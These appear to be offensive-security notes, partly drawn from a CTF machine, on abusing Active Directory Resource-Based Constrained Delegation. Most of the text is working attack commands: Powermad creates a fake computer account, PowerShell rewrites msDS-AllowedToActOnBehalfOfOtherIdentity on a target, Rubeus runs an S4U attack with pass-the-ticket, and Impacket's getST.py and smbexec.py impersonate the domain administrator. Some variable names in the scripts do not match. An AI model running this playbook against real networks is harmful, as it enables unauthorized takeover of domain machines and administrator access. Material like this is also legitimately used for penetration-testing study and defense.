\section{Resource based constrained delegation attack}
Tools needed:
\begin{itemize}
    \item \href{https://github.com/Kevin-Robertson/Powermad}{powermad}
    \item \href{https://github.com/GhostPack/Rubeus}{Rubeus}
\end{itemize}


\subsection{attack only on windows}
structure of attacking Resource-based Constrained Delegation
\ref{windows:authentication:kerberos:delegation}:
\begin{itemize}
    \item The attacker compromises an account that has a SPN or creates one
        (“Service A”). Note that any Admin User without any other special
        privilege can create up until 10 Computer objects (MachineAccountQuota)
        and set them a SPN. So the attacker can just create a Computer object
        and set a SPN.
    \item The attacker configures resource-based constrained delegation from
        Service A to the victim host.
    \item The attacker uses Rubeus to perform a full S4U attack (S4U2Self and
        S4U2Proxy) from Service A to Service B for a user with privileged
        access to Service B
        \begin{enumerate}
            \item S4U2Self (from the SPN compromised/created account): Ask for
                a TGS of Administrator to me (Not Forwardable).
            \item S4U2Proxy: Use the not Forwardable TGS of the step before to
                ask for a TGS from Administrator to the victim host.
            \item Even if you are using a not Forwardable TGS, as you are
                exploiting Resource-based constrained delegation, it will
                work.
        \end{enumerate}
    \item The attacker can pass-the-ticket and impersonate the user to gain
        access to the victim
\end{itemize}

\begin{verbatim}
# Creating a Computer Object
import-module powermad

New-MachineAccount -MachineAccount FAKECOMPUTER 
    -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

Get-DomainComputer FAKECOMPUTER #Check if created if you have powerview

# ###
# Configuring Resource-based Constrained Delegation
# ###
# Assing delegation privileges
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$ 

# Check that it worked
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount 


$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | 
    Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor \
    -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer |
    Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer \
    -Properties 'msds-allowedtoactonbehalfofotheridentity'

# create an SPN
setspn -S pwn/TARGET_NAME.DOMAIN TARGET_NAME

# ###
# Performing a complete S4U attack
# ###
.\Rubeus.exe hash /password:123456 \
    /user:FAKECOMPUTER$ \
    /domain:domain.local
# create an SPN
setspn -S pwn/TARGET_NAME.DOMAIN TARGET_NAME

rubeus.exe s4u /user:FAKECOMPUTER$ \
    /aes256:<aes256 hash> /aes128:<aes128 hash> \
    /rc4:<rc4 hash> /impersonateuser:administrator \
    /msdsspn:cifs/victim.domain.local \
    /domain:domain.local \
    /ptt


ls \\victim.domain.local\C$

\end{verbatim}



\subsection{Attack on windows and linux}
\begin{itemize}
    \item the attacker has acces to a computer $c$ with a  user $u$;
    \item $u$ has WRITE privilege over a target computer $t$;
    \item $u$creates a new computer object $f$ in Active Directory (no admin
        required);
    \item $u$ leverages the WRITE privilege on the $t$ computer object and
        updates its object's attribute
        \verb+msDS-AllowedToActOnBehalfOfOtherIdentity+ to enable the newly
        created computer $f$ to impersonate and authenticate any domain user
        that can then access the target system $t$. In human terms this means
        that the target computer $t$ is happy for the computer $f$ to
        impersonate any domain user and give them any access (even Domain Admin
        privileges) to $t$;
    \item $t$ trusts $f$ due to the modified
        \verb+msDS-AllowedToActOnBehalfOfOtherIdentity+;
    \item We request Kerberos tickets for $f$ with ability to impersonate
     a Domain Admin;
    \item $u$ can access \verb+c$+ share of $t$ from $c$ 
\end{itemize}


\subsubsection{Windows part} 
\begin{itemize}
    \item Add the new fake computer object to AD.
    \item Set the new fake computer object with Constrained Delegation privilege.
    \item Generate the password hashes for the new fake computer. 
\end{itemize}

\begin{verbatim}
evil-winrm -i IP  -u user -p password
# -------- On Server Side
# Upload tools
upload /FULL/PATH/Powermad.ps1 pm.ps1
upload /FULL/PATH/Rubeus.exe r.exe

# Import PowerMad
Import-Module ./pm.ps1

# Set variables
Set-Variable -Name "fake" -Value "PWN"
Set-Variable -Name "target" -Value TARGET_NAME

# With Powermad, Add the new fake computer object to AD.
New-MachineAccount -MachineAccount (Get-Variable -Name "fake").Value \
    -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# With Built-in AD modules, give the new fake computer object the 
# Constrained Delegation privilege.
Set-ADComputer (Get-Variable -Name "target").Value \
    -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

# With Built-in AD modules, check that the last command worked.
Get-ADComputer (Get-Variable -Name "targetComputer").Value \
    -Properties PrincipalsAllowedToDelegateToAccount

# With Rubeus, generate the new fake computer object password hashes. 
#  it is needed for the next step.
./r.exe hash /password:123456 /user:PWN$ /domain:DOMAIN
# create an SPN
setspn -S pwn/TARGET_NAME.DOMAIN TARGET_NAME
\end{verbatim}


\subsubsection{Linux part}
We have exploited the security hole and given the computer object FAKE01 the
right to impersonate others. So we can now request a new Kerberos
Ticket-Granting-Ticket(TGT) to the resources on dc.support.htb while
impersonating the user administrator. This is done remotely from our attacking
system.

\begin{verbatim}
# -------- On Attck Box Side.
# Using getTGT from Impacket, generate a ccached TGT 
# and used KERB5CCNAME pass the ccahe file for the requested service.
#   If you are getting errors, "cd ~/impacket/", "python3 -m pip install ."

getST.py DOMAIN/PWN -dc-ip IP -impersonate administrator \
    -spn pwn/TARGET_NAME.DOMAIN \
    -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

# Set local variable of KERB5CCNAME to pass the ccahe TGT file 
# for the requested service.
export KRB5CCNAME=administrator.ccache

# Use smbexec.py to connect with the TGT we just made 
# to the server as the user administrator  over SMB protocol.
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
\end{verbatim}

\subsection{links}
\begin{itemize}
    \item 
        \href{https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html}{Abusing
        Resource-Based Constrained Delegation to Attack Active Directory}
    \item 
        \href{https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/}{Resource-Based
        Constrained Delegation Abuse}
    \item
        \href{https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation}{Resource-based
        Constrained Delegation}
    \item
        \href{https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution}{Kerberos
        Resource-based Constrained Delegation: Computer Object Takeover}
    \item
        \href{https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-genericwrite-write-on-computer}{GenericAll / GenericWrite / Write on Computer}
\end{itemize}


